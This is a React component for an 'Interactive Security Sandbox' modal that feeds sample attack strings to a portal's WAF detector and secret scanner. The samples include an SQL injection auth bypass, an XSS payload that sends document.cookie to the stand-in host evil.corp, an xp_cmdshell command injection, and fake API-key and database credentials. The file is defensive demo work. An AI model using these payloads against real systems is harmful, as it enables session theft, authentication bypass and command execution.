import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  ShieldAlert, ShieldCheck, Zap, Terminal, Copy, Check,
  Play, RefreshCw, KeyRound, Bug, Lock, ArrowRight, X, AlertTriangle
} from "lucide-react";
import { detectPayload } from "../utils/attackDetection";
import { scanTextForSecrets } from "../utils/secretScanner";

const DEMO_SCENARIOS = [
  {
    id: "sqli_bypass",
    title: "SQL Injection (Auth Bypass)",
    type: "SQLi",
    category: "OWASP A03: Injection",
    payload: "' OR 1=1 --",
    description: "Attacker attempts to alter query logic so that evaluation is always true, bypassing authentication passwords.",
  },
  {
    id: "xss_script",
    title: "Cross-Site Scripting (XSS)",
    type: "XSS",
    category: "OWASP A03: Injection",
    payload: "<script>fetch('https://evil.corp/steal?c='+document.cookie)</script>",
    description: "Injects hostile JavaScript into victim browsers to hijack authentication cookies and session tokens.",
  },
  {
    id: "secret_openai",
    title: "OpenAI / LLM API Key Leak",
    type: "Secret Leak",
    category: "OWASP A02: Credential Exposure",
    payload: "sk-proj-783610482910482901928301928391203948572019482",
    description: "A developer accidentally pastes a live production OpenAI secret key into a task description or comment.",
  },
  {
    id: "secret_db",
    title: "Database URI with Credentials",
    type: "Secret Leak",
    category: "OWASP A02: Credential Exposure",
    payload: "mongodb+srv://admin_root:SuperSecretP@ss99@cluster0.prod.mongodb.net/company_db",
    description: "Exposes administrative database credentials and cluster connection strings in persistent storage.",
  },
  {
    id: "cmd_exec",
    title: "Command Execution Injection",
    type: "Command Injection",
    category: "OWASP A03: Injection",
    payload: "test'; EXEC xp_cmdshell('whoami'); --",
    description: "Attempts to trigger host operating system shell commands via stored database procedures.",
  },
];

const SecurityDemoModal = ({ isOpen, onClose, onTriggerAlert }) => {
  const [selectedScenario, setSelectedScenario] = useState(DEMO_SCENARIOS[0]);
  const [customPayload, setCustomPayload] = useState(DEMO_SCENARIOS[0].payload);
  const [copied, setCopied] = useState(false);
  const [simulating, setSimulating] = useState(false);
  const [simulationResult, setSimulationResult] = useState(null);

  if (!isOpen) return null;

  const handleSelectScenario = (sc) => {
    setSelectedScenario(sc);
    setCustomPayload(sc.payload);
    setSimulationResult(null);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(customPayload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const runSimulation = () => {
    setSimulating(true);
    setSimulationResult(null);

    setTimeout(() => {
      // 1. Check for injection pattern
      const injectionThreat = detectPayload(customPayload);

      // 2. Check for secret leak
      const secretFindings = scanTextForSecrets(customPayload, "demo_input");

      let result = null;
      if (injectionThreat) {
        result = {
          blocked: true,
          threatType: injectionThreat,
          category: "OWASP A03: Injection Attack",
          layer: "In-App WAF (Payload Guard)",
          latency: (Math.random() * 1.5 + 0.4).toFixed(1) + " ms",
          recommendation: "Reject payload, log source IP to audit trail, trigger security alert modal.",
        };
      } else if (secretFindings.length > 0) {
        result = {
          blocked: true,
          threatType: secretFindings[0].type,
          category: "OWASP A02: Credential Exposure",
          layer: "Secret & Credential Scanner",
          latency: (Math.random() * 1.2 + 0.3).toFixed(1) + " ms",
          recommendation: "Auto-redact sensitive key before persisting to database storage.",
        };
      } else {
        result = {
          blocked: false,
          threatType: "Safe / No Threats Found",
          category: "Standard User Input",
          layer: "Passed Client Gateway",
          latency: "0.2 ms",
          recommendation: "Payload is clean. Input sanitized and accepted.",
        };
      }

      setSimulationResult(result);
      setSimulating(false);
    }, 400);
  };

  const handleTriggerRealModal = () => {
    if (simulationResult?.threatType && onTriggerAlert) {
      onTriggerAlert(simulationResult.threatType);
      onClose();
    }
  };

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 15 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 15 }}
          transition={{ duration: 0.18 }}
          className="bg-[var(--bg-secondary)] border border-[var(--border-color)] rounded-2xl max-w-2xl w-full shadow-2xl overflow-hidden flex flex-col max-h-[92vh]"
        >
          {/* Header */}
          <div className="p-5 sm:p-6 border-b border-[var(--border-color)] flex items-start justify-between bg-gradient-to-r from-blue-500/10 via-purple-500/10 to-transparent">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-[#4880FF]/15 border border-[#4880FF]/30 text-[#4880FF] flex items-center justify-center shrink-0">
                <ShieldAlert size={22} />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h2 className="text-lg font-bold text-[var(--text-primary)]">
                    Interactive Security Sandbox
                  </h2>
                  <span className="text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-full bg-emerald-500/15 text-[#00B69B] border border-emerald-500/30">
                    Live Demo
                  </span>
                </div>
                <p className="text-xs text-[var(--text-secondary)] mt-0.5">
                  Test the portal&apos;s real-time In-App WAF & Credential Leak Detection engine.
                </p>
              </div>
            </div>
            <button
              onClick={onClose}
              className="p-1.5 rounded-lg text-gray-400 hover:text-[var(--text-primary)] hover:bg-[var(--bg-hover)] transition-colors"
            >
              <X size={18} />
            </button>
          </div>

          <div className="p-5 sm:p-6 overflow-y-auto flex flex-col gap-5">
            {/* Scenarios pills */}
            <div>
              <span className="text-xs font-bold text-[var(--text-muted)] uppercase tracking-wider block mb-2">
                1. Select Attack Vector
              </span>
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                {DEMO_SCENARIOS.map((sc) => {
                  const isSelected = selectedScenario.id === sc.id;
                  return (
                    <button
                      key={sc.id}
                      onClick={() => handleSelectScenario(sc)}
                      className={`text-left p-2.5 rounded-xl border transition-all text-xs flex flex-col justify-between ${
                        isSelected
                          ? "bg-[#4880FF]/15 border-[#4880FF] text-[var(--text-primary)] font-bold shadow-sm"
                          : "bg-[var(--bg-primary)] border-[var(--border-color)] text-[var(--text-secondary)] hover:border-gray-500"
                      }`}
                    >
                      <span className="truncate">{sc.title}</span>
                      <span className="text-[10px] opacity-75 font-mono mt-1 text-[#4880FF]">
                        {sc.type}
                      </span>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Payload preview & editor */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-xs font-bold text-[var(--text-muted)] uppercase tracking-wider">
                  2. Payload String (Editable)
                </span>
                <button
                  onClick={handleCopy}
                  className="text-xs text-[var(--text-muted)] hover:text-[#4880FF] flex items-center gap-1"
                >
                  {copied ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
                  <span>{copied ? "Copied!" : "Copy"}</span>
                </button>
              </div>

              <div className="relative">
                <textarea
                  value={customPayload}
                  onChange={(e) => {
                    setCustomPayload(e.target.value);
                    setSimulationResult(null);
                  }}
                  rows={2}
                  className="w-full bg-[var(--bg-primary)] border border-[var(--border-color)] rounded-xl p-3 font-mono text-xs text-[var(--text-primary)] focus:outline-none focus:border-[#4880FF] resize-none"
                  placeholder="Type or paste any payload string to test..."
                />
              </div>

              <p className="text-[11px] text-[var(--text-muted)] mt-1.5">
                {selectedScenario.description}
              </p>
            </div>

            {/* Launch simulation button */}
            <div className="flex items-center gap-3">
              <button
                onClick={runSimulation}
                disabled={simulating || !customPayload.trim()}
                className="btn btn--primary flex-1 py-2.5 flex items-center justify-center gap-2 font-bold text-xs shadow-md shadow-[#4880FF]/20"
              >
                {simulating ? (
                  <>
                    <RefreshCw size={14} className="animate-spin" />
                    <span>Analyzing Payload...</span>
                  </>
                ) : (
                  <>
                    <Play size={14} />
                    <span>Run Attack Simulation</span>
                  </>
                )}
              </button>
            </div>

            {/* Simulation Telemetry Result Card */}
            {simulationResult && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className={`p-4 rounded-xl border flex flex-col gap-3 ${
                  simulationResult.blocked
                    ? "bg-red-500/10 border-red-500/30"
                    : "bg-emerald-500/10 border-emerald-500/30"
                }`}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    {simulationResult.blocked ? (
                      <span className="w-2.5 h-2.5 rounded-full bg-red-400 animate-ping" />
                    ) : (
                      <span className="w-2.5 h-2.5 rounded-full bg-emerald-400" />
                    )}
                    <span className="text-xs font-extrabold uppercase tracking-wider text-[var(--text-primary)]">
                      {simulationResult.blocked ? "⚠ THREAT INTERCEPTED" : "✓ INPUT VERIFIED SAFE"}
                    </span>
                  </div>

                  <span className="text-[11px] font-mono font-bold text-[var(--text-muted)]">
                    Latency: {simulationResult.latency}
                  </span>
                </div>

                <div className="grid grid-cols-2 gap-2 text-xs">
                  <div className="bg-[var(--bg-secondary)] p-2 rounded-lg border border-[var(--border-color)]">
                    <span className="text-[10px] text-[var(--text-muted)] block uppercase font-mono">
                      Threat Signature
                    </span>
                    <span className="font-bold text-[var(--text-primary)] truncate block mt-0.5">
                      {simulationResult.threatType}
                    </span>
                  </div>

                  <div className="bg-[var(--bg-secondary)] p-2 rounded-lg border border-[var(--border-color)]">
                    <span className="text-[10px] text-[var(--text-muted)] block uppercase font-mono">
                      Defensive Shield
                    </span>
                    <span className="font-bold text-[#4880FF] truncate block mt-0.5">
                      {simulationResult.layer}
                    </span>
                  </div>
                </div>

                <div className="text-[11px] text-[var(--text-secondary)]">
                  <span className="font-bold text-[var(--text-primary)]">System Action: </span>
                  {simulationResult.recommendation}
                </div>

                {simulationResult.blocked && onTriggerAlert && (
                  <button
                    onClick={handleTriggerRealModal}
                    className="mt-1 py-1.5 px-3 rounded-lg bg-red-500/20 hover:bg-red-500/30 text-red-400 border border-red-500/30 text-xs font-bold flex items-center justify-center gap-1.5 transition-colors"
                  >
                    <span>View In-App Security Alert Modal</span>
                    <ArrowRight size={13} />
                  </button>
                )}
              </motion.div>
            )}
          </div>
        </motion.div>
      </div>
    </AnimatePresence>
  );
};

export default SecurityDemoModal;
